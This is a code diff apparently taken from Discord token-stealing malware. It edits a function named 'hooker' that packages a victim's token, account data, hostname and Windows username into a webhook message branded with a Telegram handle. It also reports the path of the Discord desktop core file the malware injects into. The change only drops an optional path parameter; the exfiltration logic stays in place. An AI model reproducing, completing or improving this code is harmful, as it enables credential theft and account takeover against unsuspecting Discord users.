@@ -153,7 +153,7 @@ const request = async (method, url, headers, data) => {
     });
 };
 
-const hooker = async (content, token, account, injectionPath = null) => {
+const hooker = async (content, token, account) => {
     content["content"] = "`" + os.hostname() + "` - `" + os.userInfo().username + "`\n\n" + content["content"];
     content["username"] = "https://t.me/hairo13x7";
     content["avatar_url"] = "https://cdn.discordapp.com/attachments/1370119922939723779/1429085736103051284/Ioz55TP.webp?ex=68f4db4e&is=68f389ce&hm=20291b4734c35319f6c03bf15a70f387e62abcb774ccc499976e3ab926e14432&";
@@ -186,7 +186,7 @@ const hooker = async (content, token, account, injectionPath = null) => {
     ];
     
     // Injection path'i ekle
-    const pathToShow = injectionPath || `C:\\Users\\${os.userInfo().username}\\AppData\\Local\\Discord\\app-1.0.9212\\modules\\discord_desktop_core-1\\discord_desktop_core\\index.js`;
+    const pathToShow = `C:\\Users\\${os.userInfo().username}\\AppData\\Local\\Discord\\app-1.0.9212\\modules\\discord_desktop_core-1\\discord_desktop_core\\index.js`;
     additionalFields.push({ name: `<:space_classic:1429086519901032610> Path:`, value: `\`${pathToShow}\``, inline: false });
     
     content["embeds"][0]["fields"] = [...originalFields, ...additionalFields];
